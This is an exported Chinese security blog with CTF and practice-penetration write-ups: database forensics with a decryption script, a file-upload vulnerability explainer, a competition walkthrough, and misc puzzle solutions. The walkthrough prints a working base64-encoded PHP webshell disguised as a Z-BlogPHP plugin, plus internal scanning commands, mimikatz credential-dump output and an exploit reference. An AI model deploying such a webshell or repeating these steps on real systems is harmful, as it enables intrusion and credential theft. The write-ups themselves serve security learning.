偏移量是   Iv（UTF-8）：130f028b5c4b9e1b
填充采用ZeroPadding
模式采用CBC</code></pre>
<p>解密后得到数据库连接的明文密码</p>
<p><img src="http://img.hzy2003628.top/202207091603277.png" alt="image-20220709160320205"></p>
<p>所以flag为KBLT123</p>
<h2 id="网站取证_3">网站取证_3</h2>
<p>首先通过数据库交易信息得到表名<img src="http://img.hzy2003628.top/202207091611892.png" alt="image-20220709161111807">锁定目标文件是WWW\application\admin\controller\Channelorder.php</p>
<p><img src="http://img.hzy2003628.top/202207091608866.png" alt="image-20220709160812796"></p>
<p><img src="http://img.hzy2003628.top/202207091608133.png" alt="image-20220709160843059"></p>
<p>审计发现关键key即为数据库金额加密混淆使用的盐值</p>
<p>即flag为jyzg123456</p>
<h2 id="网站取证_4">网站取证_4</h2>
<p>分析数据库，发现张宝和王子豪分别是id3和id5，所以也就是id3转账id5，以这样的形式</p>
<pre><code class="hljs plaintext">INSERT INTO &quot;public&quot;.&quot;tab_channel_order_list&quot; VALUES (3662, &#x27;307325933084&#x27;, &#x27;GG币&#x27;, NULL, &#x27;2022-04-23 03:45:09&#x27;, 4, 5, &#x27;mpRrlWhm&#x27;);</code></pre>
<p>顺序是收款人–&gt;付款人</p>
<p><img src="http://img.hzy2003628.top/202207091653337.png" alt="image-20220709165339271"></p>
<p>同时在数据库文件内可以找到相关交易记录</p>
<p><img src="http://img.hzy2003628.top/202207091633111.png" alt="image-20220709163316997"></p>
<p>将记录dump一下，并整理出3–&gt;5的交易数据</p>
<p><img src="http://img.hzy2003628.top/202207091640699.png" alt="image-20220709164038622"></p>
<p>这是相关汇率</p>
<p><img src="http://img.hzy2003628.top/202207091645657.png" alt="image-20220709164516572"></p>
<p>发现整理太麻烦，直接脚本里加个过滤吧</p>
<pre><code class="hljs plaintext">import hashlib
import base64
def decrypt(data):
    data = base64.b64decode(data)
    mystr = &#x27;&#x27;
    for i in range(6):
        temp = data[i] - ord(key[i])
        mystr += chr(temp)
    # print(mystr)
    return mystr
key = hashlib.new(&#x27;md5&#x27;, b&#x27;jyzg123456&#x27;).hexdigest()[:6]
# print(key)
bargain = [0.04, 0.06, 0.05, 0.07, 0.10, 0.15, 0.17, 0.23, 0.22, 0.25, 0.29, 0.20, 0.28, 0.33, 0.35, 0.35, 0.37]
fileme = open(&quot;./jy.txt&quot;, &quot;r&quot;).readlines()
sum = 0
for i in fileme:
    if &quot;&#x27;, 5, 3, &#x27;&quot; in i:
        temp = i.strip().split()
        date = int(temp[0][-2:])       
        data = temp[-1].replace(&#x27;\&#x27;&#x27;,&#x27;&#x27;)
        # print(date, data)
        sum += (int(decrypt(data)) * bargain[date-2])
        # print(sum)
        # input()
    else:
        pass
print(sum)</code></pre>
<p>运行得到总和</p>
<p><img src="http://img.hzy2003628.top/202207091655693.png" alt="image-20220709165540641"></p>
<p>即flag为15758353.760000002。交了发现不对，因为是rmb，只到小数点后两位，所以最终flag是15758353.76</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>认知文件上传</title>
    <url>/2022/04/30/%E8%AE%A4%E7%9F%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>今天系统的又看了一下文件上传，毕竟学习这个东西，不能学一半，要不然就等于没学，所所以今天系统的看了一下！</p>
<span id="more"></span>
<h1 id="什么是文件上传漏洞">什么是文件上传漏洞</h1>
<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
<h1 id="什么是webshell">什么是webshell</h1>
<p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录。</p>
<h1 id="一句话木马">一句话木马</h1>
<p>一句哈木马分成php，asp，jsp格式的木马，在这里收集记录一下，方便后续使用！</p>
<h2 id="php">PHP</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/e92107bdd324532e4255ea131c7f9f65.png?x-oss-process=hzy" alt="image-20220430200723794"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/40fed571f64fcd3d27141793ee5a035d.png?x-oss-process=hzy" alt="image-20220430200756208"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/0292e31bfdcc4a5a3b0c3893e7daacb9.png?x-oss-process=hzy" alt="image-20220430200834109"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/453c73d54515ba9c7c0a1bed88563bd4.png?x-oss-process=hzy" alt="image-20220430201001714"></p>
<h2 id="jsp">JSP</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/5cba44214116ba54a26fdf75eb0094b0.png?x-oss-process=hzy" alt="image-20220430201106701"></p>
<h2 id="asp">ASP</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/716d2cb6c6917569506efc725c535e7b.png?x-oss-process=hzy" alt="image-20220430201135791"></p>
<h2 id="aspx">ASPX</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/155759047f41c1ce8545e1d4b8717c05.png?x-oss-process=hzy" alt="image-20220430201154680"></p>
<h1 id="图片马制作">图片马制作</h1>
<p>图片马的制作：</p>
<p>1.一句话木马代码，建在php文件里，命名为1.php</p>
<p>2.用快捷键“win+R”打开cmd，先进入到先前准备好的两个文件的存放路径，然后敲命令行：copy 1.jpg/b + 1.php muma.jpg</p>
<h1 id="产生文件上传漏洞的原因">产生文件上传漏洞的原因</h1>
<h2 id="原因">原因：</h2>
<p>对于上传文件的后缀名（扩展名）没有做较为严格的限制<br>
对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查<br>
权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）<br>
web server对于上传文件或者指定目录的行为没有做限制</p>
<h2 id="原理">原理：</h2>
<p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>
<h1 id="文件上传后导致的常见安全问题">文件上传后导致的常见安全问题</h1>
<p>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代<br>
码执行;</p>
<p>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>
他通过类似方式控制策略文件的情况类似);</p>
<p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p>
<p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>
行，被用于钓鱼和欺诈。</p>
<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)&quot;执行此脚本;等等。</p>
<h1 id="总结">总结</h1>
<p>基本上对于文件上传漏洞，理论知识知道这些就可以了，其他的就是靠刷题积累解决方法！</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>由外网打点到内网横向</title>
    <url>/2023/02/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%B1%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E5%88%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%9A%84%E6%96%B0%E5%B9%B4%E5%8F%A3%E4%BB%A4%E7%BA%A2%E5%8C%85%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230127183335630.png?x-oss-process=hzy" alt="image-20230127183335630"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>2023年新年的一个渗透测试新年小比赛,来打着练练手,最终只完成了这些,想看官方讲解学习一下来着,结果官方是个买课呢,清高不理人[ps:你清高,你了不起],放博客里面记录一下吧</p>
<h1 id="gogogo">gogogo</h1>
<p>刚开始只给了一个web站点<a href="http://www.ruoji.info/">Good Luck To You! - 弱鸡 (ruoji.info)</a></p>
<h1 id="第一个flag外网打点">第一个flag–外网打点</h1>
<p>第一个flag就是签到题，当时图忘记留了，就是直接就给出flag了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124203701067.png?x-oss-process=hzy" alt="image-20230124203701067"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124203945262.png?x-oss-process=hzy" alt="image-20230124203945262"></p>
<p>Z-BlogPHP 1.7.2CMS，后台路径是zb_system/login.php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124204243445.png?x-oss-process=hzy" alt="image-20230124204243445"></p>
<p>测试没有sql注入，dir扫一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124204400876.png?x-oss-process=hzy" alt="image-20230124204400876"></p>
<p>得到后台账号密码是admin123：admin!@#45admin</p>
<p>登陆后台，主题管理可以上传zba文件getshell</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124204840067.png?x-oss-process=hzy" alt="image-20230124204840067"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124204941349.png?x-oss-process=hzy" alt="image-20230124204941349"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124205137714.png?x-oss-process=hzy" alt="image-20230124205137714"></p>
<blockquote>
<?xml version="1.0" encoding="utf-8"?>
<plugin version="php">
<id>1</id>
<type>plugin</type>
<file>
	<path></path>./plugin/hzy.php
	<stream>PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IAoJJF9TRVNTSU9OWydrJ109JGtleTsKCXNlc3Npb25fd3JpdGVfY2xvc2UoKTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/Pgo=</stream>
</file>
</plugin>
</blockquote>
<p>访问http://www.ruoji.info/zb_users/plugin/hzy.php即可，连接getshell</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124214614525.png?x-oss-process=hzy" alt="image-20230124214614525"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124214936949.png?x-oss-process=hzy" alt="image-20230124214936949"></p>
<h1 id="第二个flag内网渗透">第二个flag–内网渗透</h1>
<p>得到第二个flag</p>
<p>flag{加入星球获取更多渗透技巧}</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124215106732.png?x-oss-process=hzy" alt="image-20230124215106732"></p>
<p>乍一看，是windows系统，上传cs马发现有火绒，需要免杀绕一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124215214449.png?x-oss-process=hzy" alt="image-20230124215214449"></p>
<p>C盘下面还有个tips.txt</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230124215320771.png?x-oss-process=hzy" alt="image-20230124215320771"></p>
<blockquote>
<p>密码<br>
#登陆方式：<br>
ip=192.168.1.129<br>
port=7001<br>
protocol=http<br>
username=admin123<br>
password=c8aZaU</p>
</blockquote>
<p>CS简单做个免杀套个壳改一下特征码即可实现绕火绒，上传上去之后cs上线</p>
<blockquote>
<p>这地方到后面几天，免杀也不行了，虽说上传上去了但是运行不上线，用powershell进行上线</p>
</blockquote>
<p>上传fscan进行内网探测</p>
<pre><code class="hljs plaintext">fscan.exe -h 192.168.1.0/24 -o res.txt
fscan.exe -h 192.168.3.0/24 -o res.txt</code></pre>
<blockquote>
<p>192.168.1.1:8080 open<br>
192.168.1.129:445 open<br>
192.168.1.129:22 open<br>
192.168.1.129:80 open<br>
192.168.1.133:80 open<br>
192.168.1.4:445 open<br>
192.168.1.1:80 open<br>
192.168.1.129:6379 open<br>
192.168.1.129:139 open<br>
192.168.1.3:7890 open<br>
192.168.1.4:135 open<br>
192.168.1.133:445 open<br>
192.168.1.137:21 open<br>
192.168.1.133:7680 open<br>
192.168.1.4:139 open<br>
192.168.1.129:7001 open<br>
192.168.1.1:445 open<br>
192.168.1.136:445 open<br>
192.168.1.137:22 open<br>
192.168.1.129:1433 open<br>
192.168.1.137:80 open<br>
192.168.1.133:3306 open<br>
192.168.1.129:3306 open<br>
192.168.1.129:9200 open<br>
192.168.1.129:9000 open<br>
192.168.1.136:7001 open<br>
192.168.1.136:139 open<br>
192.168.1.133:139 open<br>
192.168.1.136:135 open<br>
192.168.1.133:135 open<br>
192.168.1.129:135 open<br>
192.168.1.137:3306 open<br>
192.168.1.137:888 open<br>
192.168.1.129:8081 open<br>
192.168.1.129:8888 open<br>
NetInfo:<br>
[<em>]192.168.1.133<br>
[-&gt;]DESKTOP-48IQAVS<br>
[-&gt;]192.168.1.133<br>
[-&gt;]192.168.243.135<br>
NetInfo:<br>
[</em>]192.168.1.136<br>
[-&gt;]weblogic<br>
[-&gt;]192.168.3.132<br>
[-&gt;]192.168.1.136<br>
NetInfo:<br>
[<em>]192.168.1.4<br>
[-&gt;]LAPTOP-S6MRVA7U<br>
[-&gt;]192.168.86.1<br>
[-&gt;]192.168.58.1<br>
[-&gt;]192.168.128.1<br>
[-&gt;]192.168.93.1<br>
[-&gt;]192.168.239.1<br>
[-&gt;]192.168.3.1<br>
[-&gt;]172.16.250.1<br>
[-&gt;]192.168.132.1<br>
[-&gt;]192.168.137.1<br>
[-&gt;]192.168.1.4<br>
[</em>] WebTitle:<a href="http://192.168.1.137:888">http://192.168.1.137:888</a>  code:403 len:263    title:403 Forbidden<br>
[+] 192.168.1.133 CVE-2020-0796 SmbGhost Vulnerable<br>
[<em>] 192.168.1.136        WORKGROUP\WEBLOGIC          Windows Server 2012 R2 Datacenter 9600<br>
[</em>] WebTitle:<a href="http://192.168.1.136:7001">http://192.168.1.136:7001</a> code:404 len:1164   title:Error 404–Not Found<br>
[<em>] 192.168.1.4          WORKGROUP\LAPTOP-S6MRVA7U<br>
[+] InfoScan:<a href="http://192.168.1.136:7001">http://192.168.1.136:7001</a> [weblogic]<br>
[</em>] WebTitle:<a href="http://192.168.1.1:8080">http://192.168.1.1:8080</a>   code:404 len:1365   title:Error 404 NOT_FOUND<br>
[<em>] WebTitle:<a href="http://192.168.1.129:8081">http://192.168.1.129:8081</a> code:200 len:0      title:None<br>
[</em>] WebTitle:<a href="http://192.168.1.129:7001">http://192.168.1.129:7001</a> code:200 len:38     title:Oracle WebLogic Server 管理控制台   #蜜罐<br>
[<em>] WebTitle:<a href="http://192.168.1.129:9200">http://192.168.1.129:9200</a> code:200 len:369    title:None<br>
[</em>] WebTitle:<a href="http://192.168.1.129">http://192.168.1.129</a>      code:200 len:20     title:Apache Tomcat/8.5.15<br>
[<em>] WebTitle:<a href="http://192.168.1.129:8888">http://192.168.1.129:8888</a> code:200 len:32     title:宝塔面板·腾讯云专享版#蜜罐<br>
[  ] WebTitle:<a href="http://192.168.1.137">http://192.168.1.137</a>      code:200 len:7      title:Laravel<br>
[+] <a href="http://192.168.1.136:7001">http://192.168.1.136:7001</a> poc-yaml-weblogic-cve-2019-2725<br>
[</em>] WebTitle:<a href="http://192.168.1.3:7890">http://192.168.1.3:7890</a>   code:401 len:447    title:None #蜜罐嫌疑<br>
[<em>] WebTitle:<a href="http://192.168.1.129:9000">http://192.168.1.129:9000</a> code:200 len:20     title:Coremail邮件系统<br>
[</em>] WebTitle:<a href="http://192.168.1.1">http://192.168.1.1</a>        code:200 len:8354   title:GM220-S   #路由器<br>
[+] InfoScan:<a href="http://192.168.1.3:7890">http://192.168.1.3:7890</a>   [Shiro]<br>
[+] InfoScan:<a href="http://192.168.1.137">http://192.168.1.137</a>      [Laravel]<br>
[*] WebTitle:<a href="http://192.168.1.133">http://192.168.1.133</a>      code:200 len:25     title:弱鸡 _Good Luck To You!    #外网对应内网地址<br>
[+] SSH:192.168.1.129:22:root root    #蜜罐</p>
<p>192.168.243.135:3306 open<br>
192.168.243.135:135 open<br>
192.168.243.135:80 open<br>
192.168.243.135:7680 open<br>
192.168.243.135:139 open<br>
192.168.243.135:445 open<br>
NetInfo:<br>
[<em>]192.168.243.135<br>
[-&gt;]DESKTOP-48IQAVS<br>
[-&gt;]192.168.1.133<br>
[-&gt;]192.168.243.135<br>
[+] 192.168.243.135 CVE-2020-0796 SmbGhost Vulnerable<br>
[</em>] WebTitle:<a href="http://192.168.243.135">http://192.168.243.135</a>    code:200 len:25     title:弱鸡 _Good Luck To You!</p>
</blockquote>
<blockquote>
<p>129几乎全是蜜罐</p>
</blockquote>
<h1 id="第三个flag-内网横向">第三个flag-内网横向</h1>
<p>cs上线</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230127113934068.png?x-oss-process=hzy" alt="image-20230127113934068"></p>
<p>抓取密码 -logonpasswords</p>
<blockquote>
<p>Authentication Id : 0 ; 506030 (00000000:0007b8ae)<br>
Session           : Interactive from 1<br>
User Name         : 123456<br>
Domain            : DESKTOP-48IQAVS<br>
Logon Server      : DESKTOP-48IQAVS<br>
Logon Time        : 2023/1/27 10:50:44<br>
SID               : S-1-5-21-3476115144-3521791377-3233357206-1001<br>
msv :	<br>
[00000003] Primary</p>
<ul>
<li>Username : 123456</li>
<li>Domain   : DESKTOP-48IQAVS</li>
<li>NTLM     : 32ed87bdb5fdc5e9cba88547376818d4</li>
<li>SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f<br>
tspkg :	<br>
wdigest :</li>
<li>Username : 123456</li>
<li>Domain   : DESKTOP-48IQAVS</li>
<li>Password : (null)<br>
kerberos :</li>
<li>Username : 123456</li>
<li>Domain   : DESKTOP-48IQAVS</li>
<li>Password : (null)<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 505975 (00000000:0007b877)<br>
Session           : Interactive from 1<br>
User Name         : 123456<br>
Domain            : DESKTOP-48IQAVS<br>
Logon Server      : DESKTOP-48IQAVS<br>
Logon Time        : 2023/1/27 10:50:44<br>
SID               : S-1-5-21-3476115144-3521791377-3233357206-1001<br>
msv :	<br>
[00000003] Primary</p>
<ul>
<li>Username : 123456</li>
<li>Domain   : DESKTOP-48IQAVS</li>
<li>NTLM     : 32ed87bdb5fdc5e9cba88547376818d4</li>
<li>SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f<br>
tspkg :	<br>
wdigest :</li>
<li>Username : 123456</li>
<li>Domain   : DESKTOP-48IQAVS</li>
<li>Password : (null)<br>
kerberos :</li>
<li>Username : 123456</li>
<li>Domain   : DESKTOP-48IQAVS</li>
<li>Password : (null)<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 997 (00000000:000003e5)<br>
Session           : Service from 0<br>
User Name         : LOCAL SERVICE<br>
Domain            : NT AUTHORITY<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:43:26<br>
SID               : S-1-5-19<br>
msv :	<br>
tspkg :	<br>
wdigest :</p>
<ul>
<li>Username : (null)</li>
<li>Domain   : (null)</li>
<li>Password : (null)<br>
kerberos :</li>
<li>Username : (null)</li>
<li>Domain   : (null)</li>
<li>Password : (null)<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 80714 (00000000:00013b4a)<br>
Session           : Interactive from 1<br>
User Name         : DWM-1<br>
Domain            : Window Manager<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:43:24<br>
SID               : S-1-5-90-0-1<br>
msv :	<br>
tspkg :	<br>
wdigest :</p>
<ul>
<li>Username : DESKTOP-48IQAVS$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
kerberos :	<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 80682 (00000000:00013b2a)<br>
Session           : Interactive from 1<br>
User Name         : DWM-1<br>
Domain            : Window Manager<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:43:24<br>
SID               : S-1-5-90-0-1<br>
msv :	<br>
tspkg :	<br>
wdigest :</p>
<ul>
<li>Username : DESKTOP-48IQAVS$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
kerberos :	<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 996 (00000000:000003e4)<br>
Session           : Service from 0<br>
User Name         : DESKTOP-48IQAVS$<br>
Domain            : WORKGROUP<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:43:16<br>
SID               : S-1-5-20<br>
msv :	<br>
tspkg :	<br>
wdigest :</p>
<ul>
<li>Username : DESKTOP-48IQAVS$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
kerberos :</li>
<li>Username : desktop-48iqavs$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 56317 (00000000:0000dbfd)<br>
Session           : Interactive from 0<br>
User Name         : UMFD-0<br>
Domain            : Font Driver Host<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:43:03<br>
SID               : S-1-5-96-0-0<br>
msv :	<br>
tspkg :	<br>
wdigest :</p>
<ul>
<li>Username : DESKTOP-48IQAVS$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
kerberos :	<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 56318 (00000000:0000dbfe)<br>
Session           : Interactive from 1<br>
User Name         : UMFD-1<br>
Domain            : Font Driver Host<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:43:03<br>
SID               : S-1-5-96-0-1<br>
msv :	<br>
tspkg :	<br>
wdigest :</p>
<ul>
<li>Username : DESKTOP-48IQAVS$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
kerberos :	<br>
ssp :	KO<br>
credman :</li>
</ul>
<p>Authentication Id : 0 ; 55168 (00000000:0000d780)<br>
Session           : UndefinedLogonType from 0<br>
User Name         : (null)<br>
Domain            : (null)<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:42:43<br>
SID               :<br>
msv :	<br>
tspkg :	<br>
wdigest :	<br>
kerberos :	<br>
ssp :	KO<br>
credman :</p>
<p>Authentication Id : 0 ; 999 (00000000:000003e7)<br>
Session           : UndefinedLogonType from 0<br>
User Name         : DESKTOP-48IQAVS$<br>
Domain            : WORKGROUP<br>
Logon Server      : (null)<br>
Logon Time        : 2023/1/27 10:42:38<br>
SID               : S-1-5-18<br>
msv :	<br>
tspkg :	<br>
wdigest :</p>
<ul>
<li>Username : DESKTOP-48IQAVS$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
kerberos :</li>
<li>Username : desktop-48iqavs$</li>
<li>Domain   : WORKGROUP</li>
<li>Password : (null)<br>
ssp :	KO<br>
credman :</li>
</ul>
</blockquote>
<p>内网横向探测</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230127114734413.png?x-oss-process=hzy" alt="image-20230127114734413"></p>
<p>192.168.243.161</p>
<blockquote>
<p>192.168.1.129:445 open<br>
192.168.1.143:139 open<br>
192.168.1.133:139 open<br>
192.168.1.129:139 open<br>
192.168.1.133:135 open<br>
192.168.1.129:135 open<br>
192.168.1.133:80 open<br>
192.168.1.129:80 open<br>
192.168.1.129:22 open<br>
192.168.1.129:6379 open<br>
192.168.1.133:3306 open<br>
192.168.1.129:7001 open<br>
192.168.1.129:9000 open<br>
192.168.1.129:9200 open<br>
192.168.1.129:1433 open<br>
192.168.1.133:7680 open<br>
192.168.1.143:135 open<br>
192.168.1.133:445 open<br>
192.168.1.143:445 open<br>
192.168.1.129:3306 open<br>
192.168.1.129:8081 open<br>
192.168.1.129:8888 open</p>
</blockquote>
<p>weblogic <a href="http://192.168.1.129:7001/">Oracle WebLogic Server 管理控制台</a>    存在CVE-2019-2725</p>
<p><a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230125152820966.png?x-oss-process=hzy" alt="image-20230125152820966"></p>
<p>flag：20438912</p>
<h1 id="发现蜜罐">发现蜜罐</h1>
<p>[+] SSH:192.168.1.129:22:root root</p>
<p>这个ssh服务练上去之后发现是蜜罐</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230127132802270.png?x-oss-process=hzy" alt="image-20230127132802270"></p>
<p>上面发现的C盘下的tips.txt地址是weblogic服务也是蜜罐，真实的地址是192.168.1.136:7001</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>河南金盾信安CTF</title>
    <url>/2022/12/18/%E9%87%91%E7%9B%BE2022/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20221218221949329.png?x-oss-process=hzy" alt="image-20221218221949329"></p>
<span id="more"></span>
<h2 id="前言">前言</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image002.jpg?x-oss-process=hzy" alt="img"></p>
<p>第十八，省二，某些高校py太严重了，就这样！</p>
<h2 id="解题wp">解题WP</h2>
<h3 id="misc-盗梦空间">MISC-盗梦空间</h3>
<p>Base解码，32-&gt;91-&gt;64-&gt;35-&gt;16得到逆序flag</p>
<p>}neMnAnaiTgniJieBevoLI{galf</p>
<p>倒序输出得到flag</p>
<p>flag{ILoveBeiJingTianAnMen}</p>
<h3 id="misc-qianda0_sudoku">MISC-qianda0_Sudoku</h3>
<p>题目附件给了一张数独表，直接使用在线数独求解器</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647663.png?x-oss-process=hzy" alt="img"></p>
<p>本来想着是直接解出来的字符就是flag，但是经过尝试后发现不对；</p>
<p>所以换了种思路，把空白的格子变为0，有数字的格子看为1，从左到右，从上到下</p>
<p>排列为一串01格式的编码，最终得到</p>
<p>011100110111010101100100001100000110101101110101010111110110011001110101010011100</p>
<p>直接二进制转字符得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647665.png?x-oss-process=hzy" alt="img"></p>
<p>flag{sud0ku_fuN}</p>
<h3 id="misc-megumi">MISC-Megumi</h3>
<p>题目提示是同人游戏社团，在线识图</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647673.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647675.png?x-oss-process=hzy" alt="img"></p>
<p>得到这个社团名字是blessingsoftware</p>
<p>题目又提示guess是什么隐写，所以是outguess隐写</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647676.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag</p>
<p>flag{Megumi-Kato}</p>
<h3 id="misc-数据泄露01-账号泄露追踪">MISC-数据泄露01-账号泄露追踪</h3>
<p>根据题目全网搜，最终在github里面找到了红香蕉</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202302011647682.png?x-oss-process=hzy" alt="img"></p>
<p>下载到本地找了一下，找到了key</p>
